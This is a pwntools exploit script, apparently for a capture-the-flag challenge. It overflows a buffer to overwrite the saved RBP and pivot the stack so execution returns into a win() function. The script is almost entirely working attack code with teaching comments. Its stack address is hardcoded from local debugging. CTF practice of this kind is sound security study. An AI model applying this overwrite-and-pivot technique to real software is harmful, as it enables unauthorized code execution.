#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up the context for the binary
context.update(arch='amd64', os='linux')

# --- CONFIGURATION ---

# The target binary
# If you have the binary, you can use ELF to get symbols automatically
e = ELF('./chall')
win_addr = e.symbols['win']

# Since we don't have the binary, we'll hardcode the address of win()
# This address is inferred from the provided source code.
win_addr = 0x004011cf

# The offset from the start of our buffer to the saved RBP register.
# The buffer is at rbp-24, so we need 24 bytes of padding.
offset_to_rbp = 24

# The address of our buffer on the stack.
# IMPORTANT: This address was found by debugging the binary locally with GDB
# and ASLR disabled. It might be different on the remote server.
# If the exploit fails, you may need to find the correct address
# through an info leak or by brute-forcing the lower bytes.
# Command in GDB: `b vuln`, `r`, then `info reg rbp`. buffer_addr = rbp - 24.
# Example GDB output: rbp=0x7fffffffdc50 -> buffer_addr=0x7fffffffdc38
pivot_addr = 0x7fffffffdc38

# --- PAYLOAD CONSTRUCTION ---

# We will build a fake stack frame in our buffer. When main's `leave; ret`
# executes, RSP will point to our buffer.
#
# The `leave` instruction does:
#   mov rsp, rbp
#   pop rbp
#
# The `ret` instruction does:
#   pop rip
#
# Our controlled RBP will point to `pivot_addr`.
# So, `main`'s `leave` will set RSP to `pivot_addr`.
#
# The stack will look like this at `pivot_addr`:
#
# [pivot_addr + 0]  : Value to be popped into RBP (can be anything)
# [pivot_addr + 8]  : Value to be popped into RIP (address of win())

log.info("Constructing the payload...")

payload = b''
# 1. Fake RBP for main's `leave` instruction. We don't care about its value.
payload += p64(0xdeadbeefdeadbeef)

# 2. The address we want to return to: win()
payload += p64(win_addr)

# 3. Pad the buffer until we reach the saved RBP on the stack.
# The payload so far is 16 bytes. The buffer is 24 bytes.
# We need 24 - 16 = 8 bytes of padding.
payload += b'A' * (offset_to_rbp - len(payload))

# 4. Overwrite the saved RBP with the address of our fake stack.
# This is the address that `vuln`'s `leave` will pop into RBP.
payload += p64(pivot_addr)

log.info(f"Payload length: {len(payload)} bytes")
log.info(f"Address of win function: {hex(win_addr)}")
log.info(f"Stack pivot address: {hex(pivot_addr)}")

# --- EXPLOITATION ---

def exploit():
    """
    Connects to the remote server and sends the payload.
    """
    # Connect to the remote server
    p = process('./chall')
    #p = remote('ctf.compfest.id', 7004)

    # Receive the prompt
    p.recvuntil(b'>> ')

    # Send the payload
    log.info("Sending payload...")
    p.sendline(payload)

    # Switch to interactive mode to receive the flag
    log.success("Payload sent! Switching to interactive mode...")
    p.interactive()

if __name__ == "__main__":
    exploit()
